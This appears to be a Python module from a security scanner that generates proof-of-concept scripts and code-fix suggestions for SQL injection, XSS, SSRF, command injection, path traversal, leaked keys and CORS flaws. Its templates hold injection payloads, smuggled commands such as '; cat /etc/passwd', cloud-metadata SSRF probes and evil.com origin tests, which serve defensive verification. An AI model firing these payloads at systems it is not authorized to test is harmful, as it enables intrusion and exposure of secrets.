#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC自动生成与修复（PoC Generator & Fixer）

借鉴Strix的设计：
1. 漏洞PoC自动生成 - 根据漏洞类型生成可执行的验证脚本
2. 漏洞验证 - 执行PoC验证漏洞是否真实存在
3. 修复方案生成 - 生成代码级修复建议
4. PR修复建议 - 生成可提交的修复代码（模拟）

支持的漏洞类型：SQL注入、XSS、SSRF、命令注入、路径遍历、IDOR、
弱密码、硬编码密钥、缺失认证、CORS配置错误等。
"""

import json
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum


class VulnType(Enum):
    """漏洞类型"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    SSRF = "ssrf"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    IDOR = "idor"
    WEAK_PASSWORD = "weak_password"
    HARDCODED_KEY = "hardcoded_key"
    MISSING_AUTH = "missing_auth"
    CORS_MISCONFIG = "cors_misconfig"
    OPEN_REDIRECT = "open_redirect"
    XXE = "xxe"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    CSRF = "csrf"


@dataclass
class PoCResult:
    """PoC执行结果"""
    vuln_type: str
    target: str
    poc_code: str
    language: str
    verified: bool = False
    evidence: str = ""
    confidence: float = 0.0


@dataclass
class FixSuggestion:
    """修复建议"""
    vuln_type: str
    fix_type: str  # code/config/architecture
    description: str
    code_before: str = ""
    code_after: str = ""
    priority: str = "P1"
    references: List[str] = field(default_factory=list)


class PoCGenerator:
    """
    PoC自动生成器

    根据漏洞类型生成可执行的验证脚本。
    """

    def __init__(self):
        self.poc_templates = self._init_templates()
        self.fix_library = self._init_fix_library()

    def _init_templates(self) -> Dict[str, Dict]:
        """初始化PoC模板库"""
        return {
            "sql_injection": {
                "language": "python",
                "description": "SQL注入验证PoC",
                "code": '''import requests
import sys

target = "{target}"
param = "{param}"

# 测试布尔盲注
payloads = [
    "' AND '1'='1",
    "' AND '1'='2",
    "' OR '1'='1",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
]

for payload in payloads:
    try:
        r = requests.get(target, params={{param: payload}}, timeout=10)
        print(f"[*] Payload: {{payload[:30]}}... -> Status: {{r.status_code}}, Length: {{len(r.text)}}")
        if "error" in r.text.lower() or "sql" in r.text.lower():
            print(f"[+] SQL注入可能存在: {{payload}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            },
            "xss": {
                "language": "python",
                "description": "XSS验证PoC",
                "code": '''import requests
import sys

target = "{target}"
param = "{param}"

# 测试XSS payload
payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

for payload in payloads:
    try:
        r = requests.get(target, params={{param: payload}}, timeout=10)
        if payload in r.text:
            print(f"[+] XSS存在: {{payload}}")
            print(f"    反射位置: {{r.text.find(payload)}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            },
            "ssrf": {
                "language": "python",
                "description": "SSRF验证PoC",
                "code": '''import requests
import sys

target = "{target}"
param = "{param}"

# 测试SSRF
internal_urls = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:22",
    "file:///etc/passwd",
]

for url in internal_urls:
    try:
        r = requests.get(target, params={{param: url}}, timeout=10)
        print(f"[*] {{url}} -> Status: {{r.status_code}}, Length: {{len(r.text)}}")
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] SSRF可能存在: {{url}}")
    except Exception as e:
        print(f"[-] {{url}} -> Error: {{e}}")
''',
            },
            "command_injection": {
                "language": "python",
                "description": "命令注入验证PoC",
                "code": '''import requests
import sys

target = "{target}"
param = "{param}"

# 测试命令注入
payloads = [
    "; id",
    "| id",
    "&& id",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
]

for payload in payloads:
    try:
        r = requests.get(target, params={{param: payload}}, timeout=10)
        if "uid=" in r.text or "root:" in r.text:
            print(f"[+] 命令注入存在: {{payload}}")
            print(f"    响应: {{r.text[:200]}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            },
            "path_traversal": {
                "language": "python",
                "description": "路径遍历验证PoC",
                "code": '''import requests
import sys

target = "{target}"
param = "{param}"

# 测试路径遍历
payloads = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd",
]

for payload in payloads:
    try:
        r = requests.get(target, params={{param: payload}}, timeout=10)
        if "root:x:" in r.text or "[extensions]" in r.text:
            print(f"[+] 路径遍历存在: {{payload}}")
            print(f"    响应前200字符: {{r.text[:200]}}")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            },
            "hardcoded_key": {
                "language": "python",
                "description": "硬编码密钥验证PoC",
                "code": '''import requests
import sys

api_key = "{api_key}"
api_endpoint = "{api_endpoint}"

# 测试密钥是否有效
headers = {{"Authorization": f"Bearer {{api_key}}"}}

try:
    r = requests.get(api_endpoint, headers=headers, timeout=10)
    print(f"[*] 状态码: {{r.status_code}}")
    if r.status_code == 200:
        print(f"[+] 密钥有效! 响应: {{r.text[:200]}}")
    elif r.status_code == 401:
        print(f"[-] 密钥无效或已过期")
    else:
        print(f"[?] 未知状态: {{r.status_code}}")
except Exception as e:
    print(f"[-] Error: {{e}}")
''',
            },
            "cors_misconfig": {
                "language": "python",
                "description": "CORS配置错误验证PoC",
                "code": '''import requests
import sys

target = "{target}"

# 测试CORS配置
origins = [
    "https://evil.com",
    "https://attacker.example.com",
    "null",
    "http://localhost:8080",
]

for origin in origins:
    try:
        headers = {{"Origin": origin}}
        r = requests.get(target, headers=headers, timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        print(f"[*] Origin: {{origin}} -> ACAO: {{acao}}, ACAC: {{acac}}")
        if acao == origin and acac == "true":
            print(f"[+] CORS配置错误: 允许任意origin且带凭证")
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            },
        }

    def _init_fix_library(self) -> Dict[str, FixSuggestion]:
        """初始化修复方案库"""
        fixes = {
            "sql_injection": FixSuggestion(
                vuln_type="sql_injection",
                fix_type="code",
                description="使用参数化查询/预编译语句，禁止字符串拼接SQL",
                code_before="cursor.execute(f\"SELECT * FROM users WHERE id='{user_id}'\")",
                code_after="cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
                priority="P0",
                references=["OWASP SQL Injection Prevention", "CWE-89"],
            ),
            "xss": FixSuggestion(
                vuln_type="xss",
                fix_type="code",
                description="输出编码，使用CSP策略，HttpOnly Cookie",
                code_before="echo $_GET['name'];",
                code_after="echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');",
                priority="P1",
                references=["OWASP XSS Prevention", "CWE-79"],
            ),
            "ssrf": FixSuggestion(
                vuln_type="ssrf",
                fix_type="code",
                description="URL白名单验证，禁止内网地址，使用DNS重绑定防护",
                code_before="requests.get(user_input_url)",
                code_after="# 验证URL不在内网范围\ndef is_safe_url(url):\n    parsed = urlparse(url)\n    ip = socket.gethostbyname(parsed.hostname)\n    return not ipaddress.ip_address(ip).is_private",
                priority="P0",
                references=["OWASP SSRF Prevention", "CWE-918"],
            ),
            "command_injection": FixSuggestion(
                vuln_type="command_injection",
                fix_type="code",
                description="避免使用系统命令，使用安全API，参数白名单验证",
                code_before="os.system(f'ping {host}')",
                code_after="subprocess.run(['ping', '-c', '1', host], check=True)",
                priority="P0",
                references=["OWASP Command Injection", "CWE-78"],
            ),
            "path_traversal": FixSuggestion(
                vuln_type="path_traversal",
                fix_type="code",
                description="规范化路径，验证在允许目录内，使用安全文件API",
                code_before="open(f'/var/www/files/{filename}')",
                code_after="base_dir = '/var/www/files/'\nfull_path = os.path.realpath(os.path.join(base_dir, filename))\nif not full_path.startswith(base_dir):\n    raise ValueError('Invalid path')",
                priority="P1",
                references=["OWASP Path Traversal", "CWE-22"],
            ),
            "hardcoded_key": FixSuggestion(
                vuln_type="hardcoded_key",
                fix_type="config",
                description="移除硬编码密钥，使用环境变量/密钥管理服务，立即轮换密钥",
                code_before="API_KEY = 'sk-abc123...'",
                code_after="API_KEY = os.environ.get('API_KEY')  # 从环境变量读取",
                priority="P0",
                references=["OWASP Secrets Management", "CWE-798"],
            ),
            "cors_misconfig": FixSuggestion(
                vuln_type="cors_misconfig",
                fix_type="config",
                description="配置严格的Origin白名单，避免使用通配符，谨慎使用Allow-Credentials",
                code_before="Access-Control-Allow-Origin: *",
                code_after="Access-Control-Allow-Origin: https://trusted.example.com\nAccess-Control-Allow-Credentials: true",
                priority="P1",
                references=["OWASP CORS", "CWE-942"],
            ),
            "idor": FixSuggestion(
                vuln_type="idor",
                fix_type="code",
                description="实施对象级授权检查，验证用户有权访问请求的资源",
                code_before="return db.get_record(request.args['id'])",
                code_after="record = db.get_record(request.args['id'])\nif record.owner_id != current_user.id:\n    abort(403)",
                priority="P0",
                references=["OWASP IDOR", "CWE-639"],
            ),
        }
        return fixes

    def generate_poc(self, vuln_type: str, target: str,
                     param: str = "id", **kwargs) -> Optional[PoCResult]:
        """生成PoC"""
        vuln_type = vuln_type.lower()

        if vuln_type not in self.poc_templates:
            return None

        template = self.poc_templates[vuln_type]
        default_kwargs = {
            "api_key": kwargs.get("api_key", "sk-example-key"),
            "api_endpoint": kwargs.get("api_endpoint", target if target.startswith("http") else "https://api.example.com"),
        }
        default_kwargs.update(kwargs)
        try:
            poc_code = template["code"].format(target=target, param=param, **default_kwargs)
        except KeyError:
            poc_code = template["code"].replace("{target}", target).replace("{param}", param)

        return PoCResult(
            vuln_type=vuln_type,
            target=target,
            poc_code=poc_code,
            language=template["language"],
            confidence=0.7,
        )

    def generate_fix(self, vuln_type: str) -> Optional[FixSuggestion]:
        """生成修复方案"""
        vuln_type = vuln_type.lower()
        return self.fix_library.get(vuln_type)

    def generate_poc_for_findings(self, findings: List[Dict]) -> List[PoCResult]:
        """为发现列表批量生成PoC"""
        pocs = []
        for finding in findings:
            ftype = finding.get('type', '').lower()
            name = finding.get('name', '').lower()
            target = finding.get('target', finding.get('ip', 'http://localhost'))

            # 映射漏洞类型
            vuln_type = None
            for vt in VulnType:
                if vt.value in ftype or vt.value in name:
                    vuln_type = vt.value
                    break

            if not vuln_type:
                # 简单关键词匹配
                if 'sql' in name or '注入' in name:
                    vuln_type = 'sql_injection'
                elif 'xss' in name or '跨站' in name:
                    vuln_type = 'xss'
                elif 'ssrf' in name:
                    vuln_type = 'ssrf'
                elif '命令' in name or 'command' in name:
                    vuln_type = 'command_injection'
                elif '路径' in name or 'traversal' in name:
                    vuln_type = 'path_traversal'
                elif '密钥' in name or 'key' in name or '硬编码' in name:
                    vuln_type = 'hardcoded_key'
                elif 'cors' in name:
                    vuln_type = 'cors_misconfig'
                elif 'idor' in name or '越权' in name:
                    vuln_type = 'idor'

            if vuln_type:
                poc = self.generate_poc(vuln_type, target)
                if poc:
                    pocs.append(poc)

        return pocs

    def generate_fixes_for_findings(self, findings: List[Dict]) -> List[FixSuggestion]:
        """为发现列表批量生成修复方案"""
        fixes = []
        seen_types = set()

        for finding in findings:
            ftype = finding.get('type', '').lower()
            name = finding.get('name', '').lower()

            for vt in VulnType:
                if vt.value in ftype or vt.value in name:
                    if vt.value not in seen_types:
                        fix = self.generate_fix(vt.value)
                        if fix:
                            fixes.append(fix)
                            seen_types.add(vt.value)
                    break

        return fixes

    def get_statistics(self) -> Dict[str, Any]:
        """获取统计"""
        return {
            "poc_templates": len(self.poc_templates),
            "fix_suggestions": len(self.fix_library),
            "supported_vuln_types": list(self.poc_templates.keys()),
        }


# 单例模式
_generator_instance: Optional[PoCGenerator] = None

def get_poc_generator() -> PoCGenerator:
    """获取全局PoC生成器实例"""
    global _generator_instance
    if _generator_instance is None:
        _generator_instance = PoCGenerator()
    return _generator_instance
